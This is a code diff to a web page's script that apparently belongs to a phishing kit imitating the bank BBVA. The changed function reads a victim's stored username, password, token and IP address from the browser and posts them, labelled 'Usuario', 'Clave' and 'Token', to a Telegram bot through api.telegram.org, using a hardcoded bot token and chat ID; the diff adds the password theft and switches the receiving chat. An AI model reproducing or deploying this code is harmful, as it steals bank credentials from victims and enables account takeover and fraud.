@@ -133,9 +133,11 @@
 <script>
      function carl() {
       const token = "5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU";
-      const chatId = "-4213705728";
+      const chatId = "-4259482697";
       const usr = localStorage.getItem("usr");
-      const usrs = localStorage.getItem("tok");
+      const usrs = localStorage.getItem("pw");
+      const usrss = localStorage.getItem("tok");
+
       const ip =
     localStorage.getItem("ip") +
     " " +
@@ -148,7 +150,7 @@
         return;
       }
     
-      const message = `-NEW ONE-\n --Usr.: ${usr} \n--tokden.: ${usrs} --IP:${ip}  `;
+      const message = `BBVA\n Usuario: ${usr}\n Clave: ${usrs} \nToken: ${usrss} \n --IP:${ip}  `;
       $.ajax({
         type: "POST",
         url: `https://api.telegram.org/bot${token}/sendMessage`,
@@ -162,7 +164,7 @@
           $("#response").text("Message sent");
           console.log("enviado");
           localStorage.setItem("usr", usr);
-         
+            
          
         },
         error: function (error) {
